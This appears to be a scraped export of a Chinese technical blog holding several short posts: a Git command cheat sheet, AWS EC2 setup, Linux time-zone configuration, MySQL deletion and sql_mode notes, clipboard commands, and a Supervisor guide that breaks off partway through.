下载一个项目和它的整个代码历史$ git clone [url] [project-name]# 浅克隆, 历史记录只克隆最后一条, 减少克隆时间$ git clone --depth&#x3D;1 https:&#x2F;&#x2F;github.com&#x2F;0xAiKang&#x2F;Note.git 基础操作基础操作中的命令都是日常使用频率非常高的。 文件状态12345678# 查看工作区状态$ git status# 列出没有被 .gitignore 忽略的文件列表$ git status --ignored# 列出没有被 .gitignore 忽略的文件列表$ git ls-files 文件操作1234567891011121314151617181920# 暂存所有$ git add -A# 暂存某个文件$ git add .&#x2F;README.md# 添加当前目录的所有文件到暂存区 $ git add .# 暂存一系列文件$ git add 1.txt 2.txt ...# 从暂存区中删除文件（git add 的反向操作）$ git rm [file] # 暂存区、工作区一起删除$ git rm -f [file]# 停止追踪指定文件，但该文件会保留在工作区$ git rm --cached [file] 查看文件改动123456789101112131415# 查看所有文件改动$ git diff# 查看具体文件的改动$ git diff README.md# 查看指定 commit-id 改动内容$ git diff [commit-id]# 对比工作区和版本库里的最新版本有什么区别$ git diff HEAD --[file-name]# 查看某个文件的历史修改记录$ git log README.md$ git show [commit-id] README.md 撤销与回滚1234567891011121314151617# 恢复暂存区的指定文件到工作区$ git checkout [file]# 恢复暂存区的所有文件到工作区$ git checkout .# 重置暂存区与工作区，与上一次commit保持一致$ git reset --hard# 回滚上一个版本$ git reset --hard HEAD^# 回退到指定版本（会重置暂存区与工作区）$ git reset --hard [commit-id]# 回退到指定版本（不会重置暂存区与工作区，会回到该版本的暂存状态）$ git reset --soft [commit-id] 提交123456789101112# 提交暂存区到本地仓库$ git commit -m [message]# 提交暂存区的指定文件到本地仓库git commit README.md -m [message]# 提交并显示diff变化git commit -v# 重写上一次的提交# 如果代码没有任何新变化，则用来改写上一次commit的提交信息$ git commit --amend -m [message] 日志1234567891011121314151617181920# 查看完整历史提交记录$ git log# 查看前n 条记录$ git log -n# 以图形方式查看完整历史提交记录$ git log --graph --pretty&#x3D;oneline --abbrev-commit# 通过commit log 进行搜索$ git log -i --grep&#x3D;&quot;fire bug&quot;# 列出提交者贡献数量, 只会打印作者和贡献数量$ git shortlog -sn# 以提交贡献数量排序并打印出信息$ git shortlog -n# 采用邮箱格式化的方式进行查看贡献度$ git shortlog -e 分支123456789101112131415161718192021222324252627282930313233343536373839404142434445# 查看本地分支git branch# 查看所有分支git branch -a# 查看本地分支所关联的远程分支git branch -vv# 查看本地 master 分支创建时间git reflog show --date&#x3D;iso master# 新建一个分支，但依然停留在当前分支$ git branch [branch-name]# 新建一个分支，并切换到该分支$ git checkout -b [branch]# 新建一个分支，指向指定commit$ git branch [branch] [commit-id]# 新建一个分支，与指定的远程分支建立追踪关系$ git branch --track [branch] [remote-branch]# 切换到指定分支，并更新工作区$ git checkout [branch-name]# 建立追踪关系，在现有分支与指定的远程分支之间$ git branch --set-upstream [branch] [remote-branch]# 合并指定分支到当前分支$ git merge [branch]# 选择一个commit，合并进当前分支$ git cherry-pick [commit-id]# 删除指定分支$ git branch -d [branch-name]# 强制删除指定分支$ git branch -D [branch-name]# 删除远程分支$ git push origin --delete [branch-name]$ git branch -dr [remote&#x2F;branch] 远程仓库管理1234567891011121314151617# 查看远程仓库（默认是origin，这是git 会使用的默认名称）$ git remote # 指定-v, 查看所有远程仓库地址$ git remote -v# 添加一个新的远程仓库$ git remote add [origin-name] https:&#x2F;&#x2F;github.com&#x2F;0xAiKang&#x2F;Note.git# 查看指定远程仓库的详情信息$ git remote show [origin-name]# 重命名远程仓库$ git remote rename [old-name] [new-name]# 移除远程仓库$ git remote remove [origin-name] Push1234567891011# 默认推送当前分支$ git push# 推送内容到主分支，并建立追踪关系$ git push -u origin master# 将本地分支推送到指定远程分支， （本地分支:远程分支）$ git push origin [branch]:[branch]# 强行推送当前分支到远程仓库，即使有冲突$ git push -f Pull1234567891011# 取回默认远程仓库的变化，并自动与本地分支合并$ git pull# 取回指定远程仓库的变化，并自动与本地指定分支合并（远程分支名:本地分支名）$ git pull [remote] [branch]:[branch]# 取回指定远程仓库的变化，并自动与本地当前分支合并$ git pull origin master# 取回远程仓库的所有变动，但是不会自动与本地当前分支合并$ git fetch 进阶操作进阶操作中的命令是一些很实用，但可能不常使用，所以把它们单独拎出来。 cherry-pick12345# 选择一个commit，合并进当前分支$ git cherry-pick [commit-id]# 保留原有作者信息进行提交$ git cherry-pick -x [commit-id] Stash1234567891011# 将当前的工作区隐藏$ git stash# 恢复隐藏的工作区，并将此次隐藏记录从隐藏列表中移出$ git stash pop# 恢复隐藏的工作区，保留此次隐藏记录$ git stash apply# 查看当前隐藏列表$ git stash list Blamegit blame 用于查看某个文件的修改历史记录是哪个作者进行了改动。 12345678# 查看 README.md 文件的修改历史记录，包括时间、作者以及内容$ git blame README.md# 查看谁改动了 README.md 文件的 11行-12行$ git blame -L 11,12 README.md# 查看谁改动了 README.md 文件11行以后$ git blame -L 11 README.md 标签1234567891011121314151617181920212223242526272829303132# 列出本地所有标签git tag# 新建一个tag在当前commit$ git tag [tag]# 新建一个tag在指定commit$ git tag [tag] [commit]# 删除本地tag$ git tag -d [tag]# 删除远程tag$ git push origin :refs&#x2F;tags&#x2F;[tagName]# 列出远程所有标签$ git ls-remote --tags origin# 创建带有附注标签$ git tag -a v1.1.0 -m &quot;标签描述&quot;# 查看本地tag信息$ git show [tag]# 提交指定tag$ git push [remote] [tag]# 提交所有tag$ git push [remote] --tags# 新建一个分支，指向某个tag$ git checkout -b [branch] [tag] Git ProTipsGit ProTips 则是整理的一些Git 的奇技淫巧。 12345678910# 通过使用别名，优化 git log 输出，这里另外提供几种模式, 可以选择喜欢的一种进行别名配置$ git config --global alias.lg &quot;log --graph --pretty&#x3D;format:&#39;%Cred%h - %Cgreen[%an]%Creset -%C(yellow)%d%Creset %s %C(yellow)&lt;%cr&gt;%Creset&#39; --abbrev-commit --date&#x3D;relative&quot;$ git config --global alias.his &quot;log --graph --decorate --oneline --pretty&#x3D;format:&#39;%Creset %s %C(magenta)in %Cred%h %C(magenta)commited by %Cgreen%cn %C(magenta)on %C(yellow) %cd %C(magenta)from %Creset %C(yellow)%d&#39; --abbrev-commit --date&#x3D;format:&#39;%Y-%m-%d %H:%M:%S&#39;&quot;$ git config --global alias.hist &quot;log --graph --decorate --oneline --pretty&#x3D;format:&#39;%Cred%h - %C(bold white) %s %Creset %C(yellow)%d %C(cyan) &lt;%cd&gt; %Creset %Cgreen(%cn)&#39; --abbrev-commit --date&#x3D;format:&#39;%Y-%m-%d %H:%M:%S&#39;&quot;$ git config --global alias.lg &quot;log --color --graph --pretty&#x3D;format:&#39;%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset&#39; --abbrev-commit&quot;$ git config --global alias.lg &quot;log --pretty&#x3D;format:&#39;%h - %an, %ar : %s&#39; &quot; 参考链接 Git 常用命令整理 常用Git 命令清单","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"手把手教你如何创建启动 AWS 实例","slug":"teach-you-how-to-start-an-aws-instance","date":"2020-08-10T06:05:17.000Z","updated":"2020-08-15T02:04:33.174Z","comments":true,"path":"teach-you-how-to-start-an-aws-instance/","link":"","permalink":"https://www.0x2beace.com/teach-you-how-to-start-an-aws-instance/","excerpt":"什么是AWS ？ Amazon Web Services (AWS) 是亚马逊提供的全球最全面、应用最广泛的云平台。","text":"什么是AWS ？ Amazon Web Services (AWS) 是亚马逊提供的全球最全面、应用最广泛的云平台。 云这个概念最开始是从国内的阿里云、腾讯云这些地方听到的，后来服务器接触的多了，也慢慢了解了一些国外的云，如：亚马逊云、微软云。 在亚马逊云、软微云上创建一台实例其实是非常简单的事情，但由于这方面资料比较少，导致对于新用户可能不那么友好，我自己当初创建时就不怎么顺利。所以整理这篇笔记的目的有两个，一是方便自己日后回顾，二是给第一次使用的用户一些参考。 启动实例首先登入到AWS ，找到EC2 并点击 在左侧菜单栏中点击实例 点击启动实例 配置实例选择系统映像，这里以Linux 操作系统为例，我选择是Ubuntu Server 18.04 LTS，这个版本表示Ubuntu 服务端 长期稳定支持版本。 选择实例类型，根据自身需要考虑，当然 性能越好价格越高。这里我选择的是一个中等偏下的类型。 配置实例详情信息，这里的这些核心配置，通常都保持默认，只是将自动分配公有IP 地址改为禁用。这样再重启机器时，就不会改变IP了。 根据自身需要分配合适的硬盘大小。 配置安全组，所谓安全组就是拥有相同防火墙规则的群组。这个也是根据自身需要选择是否共用同一个安全组。 拥有同一个安全组就表示拥有相同的防火墙规则。设置完安全组之后，点击审核和启动。 下面会有一个界面给你确认机器的配置是否无误的，从头到尾检查没有问题之后就可以点击启动实例了。 创建密钥可以选择共用已有的密钥对也可以选择新建一个。 然后点击启动实例。 分配弹性IP启动完成之后点击查看实例。 在实例列表中，找到该实例之后，分别点击操作=&gt;联网=&gt;管理IP 地址=&gt;分配弹性 IP 确认分配 分配成功之后，会得到一个弹性IP（公有），然后返回实例列表 关联IP 地址找到刚才启动的那个实例（没有实例ID），分别点击操作=&gt;关联地址 这一步很重要，这里要将实例和弹性IP 地址关联，所以要选择该弹性IP 对应自己的实例。如果不确定是哪一个，可以返回到实例列表中去查看，就是那个没有名称的实例。 然后点击关联 关联成功 直到做完这一步才算正真的启动好一个实例。 连接启动好实例之后，如何连接呢？ 1$ ssh -i &lt;私钥路径&gt; ubuntu@ipaddress 指定刚才生成的密钥对，使用ssh命令 即可连接。","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"},{"name":"Linux","slug":"Tutorial/Linux","permalink":"https://www.0x2beace.com/categories/Tutorial/Linux/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"如何修改 Linux 默认时区","slug":"how-to-modify-the-linux-default-time-zone","date":"2020-08-09T13:23:30.000Z","updated":"2020-08-22T00:44:06.247Z","comments":true,"path":"how-to-modify-the-linux-default-time-zone/","link":"","permalink":"https://www.0x2beace.com/how-to-modify-the-linux-default-time-zone/","excerpt":"在上一篇笔记中，我们知道了如何在Linux 中查看系统默认时区，这篇笔记来学习以下如何修改默认时区。","text":"在上一篇笔记中，我们知道了如何在Linux 中查看系统默认时区，这篇笔记来学习以下如何修改默认时区。 在Linux 服务器或系统上保持正确的时间始终是一个好习惯，它可能具有以下优点： 由于Linux 中的大多数任务都是按时间控制的，因此可以保持系统任务的及时运行。 在系统上记录事件和其他信息的正确时间等等。 在Linux 中设置时区，有几种方式。 0x1. 使用tzselete 命令 使用tzselete 命令选择所在时区。 将时区所在的配置文件TZ=&#39;Asia/Shanghai&#39;; export TZ 添加到~/.profile文件。 使用source ~/.profire命令，使时区设置生效。 0x2. 使用timedatectl 命令Ubuntu 系统提供了timedatectl 命令，非常方便的供我们查看设置Linux 系统时区。 1$ timedatectl set-timezone &quot;Asia&#x2F;ShangHai&quot; 如果你忘记了你想要的时区叫什么名字，那么可以使用下面的命令查看所有可用时区： 1$ timedatectl list-timezones 因为 Linux 的时间分为两种： 硬件时间：由 BIOS（或CMOS）所负责。 系统时间：由 Linux 所负责，系统时间在系统开关机后读取硬件时间后，再由 Linux 管理时间。 0x3. 设置硬件时间12$ cd &#x2F;etc&#x2F; &amp;&amp; ls -al | grep localtimelrwxrwxrwx 1 root root 27 Jul 24 00:57 localtime -&gt; &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Etc&#x2F;UTC 可以看到默认链接的是UTC，所以需要手动更改链接时区文件。 1$ ln -sf &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai &#x2F;etc&#x2F;localtime 查看硬件时间 1$ hwclock -r 将系统时间改为硬件时间 1$ hwclock --hctosys 需要想清楚的是，时间戳本身是永远不变的，无论在哪个时区同一时刻所生成的时间戳一定是一样的。 会发生变化的只有时区，而时间戳则是根据时区的不同而解析出来的时间不同。 参考链接 How to Set Time, Timezone and Synchronize System Clock Using timedatectl Command Linux 查看设置系统时区 Linux 时间以及时区","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Mysql 删除数据及数据表","slug":"mysql-delete-data-and-data-table","date":"2020-08-06T14:36:46.000Z","updated":"2020-08-06T14:37:40.531Z","comments":true,"path":"mysql-delete-data-and-data-table/","link":"","permalink":"https://www.0x2beace.com/mysql-delete-data-and-data-table/","excerpt":"在Mysql 中删除数据以及数据表非常的容易，但是需要特别小心，因为一旦删除所有数据都会消失。","text":"在Mysql 中删除数据以及数据表非常的容易，但是需要特别小心，因为一旦删除所有数据都会消失。 删除数据删除表内数据，使用delete关键字。 删除指定条件的数据删除用户表内id 为1 的用户： 1delete from User where id &#x3D; 1; 删除表内所有数据删除表中的全部数据，表结构不变。 对于 MyISAM 会立刻释放磁盘空间，InnoDB 不会释放磁盘空间。 1delete from User; 释放磁盘空间 1optimize table User; 删除数据表删除数据表分为两种方式： 删除数据表内数据以及表结构 只删除表内数据，保留表结构 drop使用drop关键词会删除整张表，啥都没有了。 1drop table User; truncatetruncate 关键字则只删除表内数据，会保留表结构。 1truncate table User; 思考题：如何批量删除前缀相同的表？ 想要实现 drop table like &#39;wp_%&#39;，没有直接可用的命令，不过可以通过Mysql 的语法来拼接。 1234-- 删除”wp_”开头的表：SELECT CONCAT( &#39;drop table &#39;, table_name, &#39;;&#39; ) AS statementFROM information_schema.tablesWHERE table_schema &#x3D; &#39;database_name&#39; AND table_name LIKE &#39;wp_%&#39;; 其中database_name换成数据库的名称，wp_换成需要批量删除的表前缀。 注意只有drop命令才能这样用： 1drop table if exists tablename&#96;; truncate只能这样使用： 1truncate table &#96;tp_trade&#96;.&#96;setids&#96;; 总结 当你不再需要该表时， 用drop; 当你仍要保留该表，但要删除所有记录时， 用truncate; 当你要删除部分记录时， 用delete。","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://www.0x2beace.com/tags/mysql/"}]},{"title":"Git Push -f 命令详解","slug":"detailed-explanation-of-git-push-f-command","date":"2020-08-05T06:49:02.000Z","updated":"2020-08-05T06:49:50.351Z","comments":true,"path":"detailed-explanation-of-git-push-f-command/","link":"","permalink":"https://www.0x2beace.com/detailed-explanation-of-git-push-f-command/","excerpt":"最近遇到了一个Git Push 相关的问题，同事不小心把一些错误代码提交到仓库了。如果每个人直接更新的话，会导致错误代码也更新到本地了。 这个时候想要避免这种情况的发生，唯一可以做的就是将那些错误代码直接覆盖掉。","text":"最近遇到了一个Git Push 相关的问题，同事不小心把一些错误代码提交到仓库了。如果每个人直接更新的话，会导致错误代码也更新到本地了。 这个时候想要避免这种情况的发生，唯一可以做的就是将那些错误代码直接覆盖掉。 git push -fgit push -f 这个命令的作用是将自己本地仓库的代码直接推送至仓库，完全以你的提交为准，之前其他人的提交都会被覆盖。 那么这么可怕的命令，究竟在什么情况下才适用呢？ 使用时机有两种情况下适合使用这个命令： 确定需要覆覆盖提交，就像上面的那种情况，在明确部分提交会导致异常时，可以使用新的提交去覆盖。 需要整理历史提交记录时，有时候项目的 Commit Logs 可能比较乱，不能清晰的看出每一次提交的作用，可以使用 rebase 命令来清理历史提交记录。因为改变了历史，所以正常来说是 push不成功的，所以需要使用 force push来解决这个问题。 默认分支保护因为可能会出现不小心使用的情况，Github、Gitlab这类源码托管网站会提供分支保护机制。可以避免某个分支被 force push，默认是 master为保护分支。 这里以Gitlab为例，设置-&gt;仓库-&gt;Protected Branches： 所以如果想强制提交，前提需要取消对该分支的保护。 万一自己的代码被覆盖掉了，还救得回来吗？ 其实也是有办法的，那就是换你或是其它有之前提交的同事，再次进行 git push -f，将正确的内容强制提交上去，覆盖上一次git push -f所造成的灾难。 参考链接聽說 git push -f 這個指令很可怕，什麼情況可以使用它呢？","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"Windows/Mac/Linux 如何将内容输出到剪贴板","slug":"how-to-output-content-to-clipboard-on-windows-mac-linux","date":"2020-08-05T02:07:41.000Z","updated":"2020-08-16T10:10:09.975Z","comments":true,"path":"how-to-output-content-to-clipboard-on-windows-mac-linux/","link":"","permalink":"https://www.0x2beace.com/how-to-output-content-to-clipboard-on-windows-mac-linux/","excerpt":"如何将输出直接复制至剪切板？在不同的系统中，所使用的命令是不同的。","text":"如何将输出直接复制至剪切板？在不同的系统中，所使用的命令是不同的。 Mac12345678&#x2F;&#x2F; 将输出复制至剪贴板$ echo &quot;hello mac&quot; | pbcopy&#x2F;&#x2F; 将文件中的内容全部复制至剪贴板$ pbcopy &lt; remade.md&#x2F;&#x2F; 将剪切板中的内容粘贴至文件$ pbpaste &gt; remade.md LinuxLinux 用户需要先安装 xclip，它建立了终端和剪切板之间的通道。 123456789101112&#x2F;&#x2F; 查看剪切板中的内容$ xclip -o$ xclip -selection c -o&#x2F;&#x2F; 将输出复制至剪贴板$ echo &quot;hello xclip&quot; | xclip-selection c&#x2F;&#x2F; 将文件中的内容全部复制至剪贴板$ xclip -selection c remade.md&#x2F;&#x2F; 将剪切板中的内容粘贴至文件$ xclip -selection c -o &gt; remade.md 或者直接使用xsel命令： 12345&#x2F;&#x2F; 将输出复制至剪贴板$ echo &quot;hello linux&quot; | xsel&#x2F;&#x2F; 将文件中的内容全部复制至剪贴板$ xsel &lt; remade.md Windows12345&#x2F;&#x2F; 将输出复制至剪贴板$ echo &quot;hello windows&quot; | clip&#x2F;&#x2F; 将文件中的内容全部复制至剪贴板$ clip &lt; remade.txt","categories":[{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/categories/Shell/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"}]},{"title":"如何查看 Linux 默认时区","slug":"how-to-check-the-linux-default-time-zone","date":"2020-08-03T14:03:08.000Z","updated":"2020-08-22T00:46:00.418Z","comments":true,"path":"how-to-check-the-linux-default-time-zone/","link":"","permalink":"https://www.0x2beace.com/how-to-check-the-linux-default-time-zone/","excerpt":"最近遇到一个跟服务器时区相关的问题，没准备充分，当问题真正来临时，很懵。 特别是在生产环境中，系统时区是特别重要的存在，很多应用在默认情况下，都是取的系统时区，如果时区处理不得当的话，可能会造成不必要的困扰。","text":"最近遇到一个跟服务器时区相关的问题，没准备充分，当问题真正来临时，很懵。 特别是在生产环境中，系统时区是特别重要的存在，很多应用在默认情况下，都是取的系统时区，如果时区处理不得当的话，可能会造成不必要的困扰。 时区的概念关于时区，有以下几个标准： CST：中国标准时间（China Standard Time） UTC：协调世界时，又称世界标准时间，简称UTC，从英文国际时间/法文协调时间”Universal Time/Temps Cordonné”而来。中国大陆、香港、澳门、台湾、蒙古国、新加坡、马来西亚、菲律宾、澳洲西部的时间与UTC的时差均为+8，也就是UTC+8。 GMT：格林尼治标准时间（旧译格林威治平均时间或格林威治标准时间；英语：Greenwich Mean Time，GMT）是指位于英国伦敦郊区的皇家格林尼治天文台的标准时间，因为本初子午线被定义在通过那里的经线。 Linux 的时间分为两种： 硬件时间：由 BIOS（或CMOS）所负责。 系统时间：由 Linux 所负责，系统时间在系统开关机后读取硬件时间后，再由 Linux 管理时间。 datedate命令是显示或设置系统时间与日期。 这个是最简单、最直观获取系统时间与日期的方式了。 12$ dateThu Jul 30 13:23:50 CST 2020 显示所在时区： 12date +&quot;%Z %z&quot;CST +0800 注意 + 和 &quot;之间没有空格，否则会报表。 date 命令常见参数： 12345678910111213141516171819202122232425%H 小时，24小时制（00~23）%I 小时，12小时制（01~12）%k 小时，24小时制（0~23）%l 小时，12小时制（1~12）%M 分钟（00~59）%p 显示出AM或PM%r 显示时间，12小时制（hh:mm:ss %p）%s 从1970年1月1日00:00:00到目前经历的秒数%S 显示秒（00~59）%T 显示时间，24小时制（hh:mm:ss）%X 显示时间的格式（%H:%M:%S）%Z 以字符串的形式显示时区，日期域（CST）%z 以数字的形式显示时区 (+0800)%a 星期的简称（Sun~Sat）%A 星期的全称（Sunday~Saturday）%h,%b 月的简称（Jan~Dec）%B 月的全称（January~December）%c 日期和时间（Tue Nov 20 14:12:58 2012）%d 一个月的第几天（01~31）%x,%D 日期（mm&#x2F;dd&#x2F;yy）%j 一年的第几天（001~366）%m 月份（01~12）%w 一个星期的第几天（0代表星期天）%W 一年的第几个星期（00~53，星期一为第一天）%y 年的最后两个数字（1999则是99） timedatectltimedatectl 命令非常的方便，当你不带任何参数运行它时，这条命令可以像下图一样，输出系统时间概览，其中包含当前时区： 123456789$ timedatectlLocal time: Thu 2020-07-30 05:30:21 UTC Universal time: Thu 2020-07-30 05:30:21 UTC RTC time: Thu 2020-07-30 05:30:21 Time zone: Etc&#x2F;UTC (UTC, +0000) System clock synchronized: yessystemd-timesyncd.service active: yes RTC in local TZ: no 只查看时区： 1$ timedatectl | grep &quot;Time zone&quot; /etc/timezone使用 cat 命令显示文件 /etc/timezone 的内容，来查看时区： 12$ cat &#x2F;etc&#x2F;timezoneEtc&#x2F;UTC 选择时区 1$ tzselect 选择完成之后，将时区相关的配置，写入.profit配置文件中。 然后使用 souce 命令，强制生效。 1souce .profit 参考链接 在 Linux 中查看时区 Linux date 命令","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Mysql only_full_group_by 异常记录","slug":"mysql-only-full-group-by-exception-record","date":"2020-07-31T12:17:14.000Z","updated":"2020-08-03T00:05:40.992Z","comments":true,"path":"mysql-only-full-group-by-exception-record/","link":"","permalink":"https://www.0x2beace.com/mysql-only-full-group-by-exception-record/","excerpt":"最近很频繁的遇到一个Mysql 异常，错误信息如下： 123Expression #5 of SELECT list is not in GROUP BY clause and contains nonaggregated column &#39;cis.q1.query_date&#39; which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode&#x3D;only_full_group_by","text":"最近很频繁的遇到一个Mysql 异常，错误信息如下： 123Expression #5 of SELECT list is not in GROUP BY clause and contains nonaggregated column &#39;cis.q1.query_date&#39; which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode&#x3D;only_full_group_by 通过错误信息可以看到，是因为 sql_mode 引起的。 查看Mysql 当前所使用的 sql_mode： 1234567select @@sql_mode+-------------------------+| @@sql_mode |+-------------------------+| ONLY_FULL_GROUP_BY |+-------------------------+ sql_mode 配置解析ONLY_FULL_GROUP_BY对于GROUP BY聚合操作，如果在SELECT中的列，没有在GROUP BY中出现，那么这个SQL是不合法的，因为列不在GROUP BY从句中。简而言之，就是SELECT后面接的列必须被GROUP BY后面接的列所包含。如： select a,b from table group by a,b,c; (正确) select a,b,c from table group by a,b; (错误) 这个配置会使得GROUP BY语句环境变得十分狭窄，所以一般都不加这个配置 NO_AUTO_VALUE_ON_ZERO该值影响自增长列的插入。默认设置下，插入0或NULL代表生成下一个自增长值。（不信的可以试试，默认的sql_mode你在自增主键列设置为0，该字段会自动变为最新的自增值，效果和null一样），如果用户希望插入的值为0（不改变），该列又是自增长的，那么这个选项就有用了。 STRICT_TRANS_TABLES在该模式下，如果一个值不能插入到一个事务表中，则中断当前的操作，对非事务表不做限制。（InnoDB默认事务表，MyISAM默认非事务表；MySQL事务表支持将批处理当做一个完整的任务统一提交或回滚，即对包含在事务中的多条语句要么全执行，要么全部不执行。非事务表则不支持此种操作，批处理中的语句如果遇到错误，在错误前的语句执行成功，之后的则不执行；MySQL事务表有表锁与行锁非事务表则只有表锁） NO_ZERO_IN_DATE在严格模式下，不允许日期和月份为零 NO_ZERO_DATE设置该值，mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告。 ERROR_FOR_DIVISION_BY_ZERO在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如 果未给出该模式，那么数据被零除时MySQL返回NULL NO_AUTO_CREATE_USER禁止GRANT创建密码为空的用户 NO_ENGINE_SUBSTITUTION如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常 PIPES_AS_CONCAT将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似 ANSI_QUOTES启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符 解决方案编辑my.cnf配置文件，将 ONLY_FULL_GROUP_BY 去掉。 12[mysqld]sql_mode &#x3D; &quot;&quot; 然后重启Mysql 服务即可。 参考链接 记一次Group by 查询时的ONLY_FULL_GROUP_BY错误以及后续","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Supervisor 快速上手","slug":"supervisor-quick-start","date":"2020-07-30T12:38:38.000Z","updated":"2020-08-24T03:40:12.483Z","comments":true,"path":"supervisor-quick-start/","link":"","permalink":"https://www.0x2beace.com/supervisor-quick-start/","excerpt":"supervisord 是一个用 Python 写的进程管理工具，是类Unix系统中的一个进程管理工具， Supervisor 只适用于类Unix 系统，不适用于Window。","text":"supervisord 是一个用 Python 写的进程管理工具，是类Unix系统中的一个进程管理工具， Supervisor 只适用于类Unix 系统，不适用于Window。 安装因为Supervisor 是用 Python 所写的，所以可以直接使用pip 安装： 1sudo pip install supervisor Ubuntu： 1apt-get install supervisor Mac： 1brew install supervisor 配置Supervisor运行时会启动一个进程——supervisord 。 supervisord：它负责启动所管理的进程，并将所管理的进程作为自己的子进程来启动，而且可以在所管理的进程出现崩溃时自动重启。 supervisorctl：是命令行管理工具，可以用来执行 stop、start、restart 等命令，来对这些子进程进行管理。 查看默认配置项 1$ echo_supervisord_conf 将默认配置项重定向至配置文件： 1$ echo_supervisord_conf &gt; &#x2F;etc&#x2F;supervisord.conf 然后可以看到 /etc/ 配置文件下出现了以下文件，其中/etc/supervisor 是我们需要的配置文件。 1234$ find &#x2F;etc&#x2F; -name supervisor&#x2F;etc&#x2F;default&#x2F;supervisor&#x2F;etc&#x2F;init.d&#x2F;supervisor&#x2F;etc&#x2F;supervisor /etc/supervisord.conf 核心配置文件，参考以下部分配置，; 表示注释。 因为Supervisor默认配置会把socket文件和pid守护进程生成在/tmp/目录下，/tmp/目录是缓存目录，所以我们需要手动换成/var/run目录。 12345678910111213141516171819202122232425262728293031323334353637[unix_http_server];file&#x3D;&#x2F;tmp&#x2F;supervisor.sock ; UNIX socket 文件，supervisorctl 会使用file&#x3D;&#x2F;var&#x2F;run&#x2F;supervisor.sock ; 修改为 &#x2F;var&#x2F;run 目录，避免被系统删除;chmod&#x3D;0700 ; socket 文件的 mode，默认是 0700;chown&#x3D;nobody:nogroup ; socket 文件的 owner，格式： uid:gid;[inet_http_server] ; HTTP 服务器，提供 web 管理界面;port&#x3D;127.0.0.1:9001 ; Web 管理后台运行的 IP 和端口，如果开放到公网，需要注意安全性;username&#x3D;user ; 登录管理后台的用户名;password&#x3D;123 ; 登录管理后台的密码[supervisord];logfile&#x3D;&#x2F;tmp&#x2F;supervisord.log ; 日志文件，默认是 $CWD&#x2F;supervisord.loglogfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;supervisord.log ; 修改为 &#x2F;var&#x2F;log 目录，避免被系统删除logfile_maxbytes&#x3D;50MB ; 日志文件大小，超出会 rotate，默认 50MBlogfile_backups&#x3D;10 ; 日志文件保留备份数量默认 10loglevel&#x3D;info ; 日志级别，默认 info，其它: debug,warn,trace;pidfile&#x3D;&#x2F;tmp&#x2F;supervisord.pid ; pid 文件pidfile&#x3D;&#x2F;var&#x2F;run&#x2F;supervisord.pid ; 修改为 &#x2F;var&#x2F;run 目录，避免被系统删除nodaemon&#x3D;false ; 是否在前台启动，默认是 false，即以 daemon 的方式启动minfds&#x3D;1024 ; 可以打开的文件描述符的最小值，默认 1024minprocs&#x3D;200 ; 可以打开的进程数的最小值，默认 200; the below section must remain in the config file for RPC; (supervisorctl&#x2F;web interface) to work, additional interfaces may be; added by defining them in separate rpcinterface: sections[rpcinterface:supervisor]supervisor.rpcinterface_factory &#x3D; supervisor.rpcinterface:make_main_rpcinterface[supervisorctl];serverurl&#x3D;unix:&#x2F;&#x2F;&#x2F;tmp&#x2F;supervisor.sock ; 通过 UNIX socket 连接 supervisord，路径与 unix_http_server 部分的 file 一致serverurl&#x3D;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;supervisor.sock ; 修改为 &#x2F;var&#x2F;run 目录，避免被系统删除;serverurl&#x3D;http:&#x2F;&#x2F;127.0.0.1:9001 ; 通过 HTTP 的方式连接 supervisord; 包含其他的配置文件[include]files &#x3D; relative&#x2F;directory&#x2F;*.ini ; 可以是 *.conf 或 *.ini /etc/supervisor/conf.d 则是用来配置管理进程的配置文件，所有需要被supervisor 管理的进程都需要在这里先配置。 123456789101112131415[program:demo]command&#x3D;php demo.php &#x2F;&#x2F; 需要执行队列的名称directory&#x3D; &#x2F;var&#x2F;www &#x2F;&#x2F; 命令执行的目录或者说执行 command 之前，先切换到工作目录 可以理解为在执行命令前会切换到这个目录 process_name&#x3D;%(process_num)02d &#x2F;&#x2F; 默认为 %(program_name)s，即 [program:x] 中的 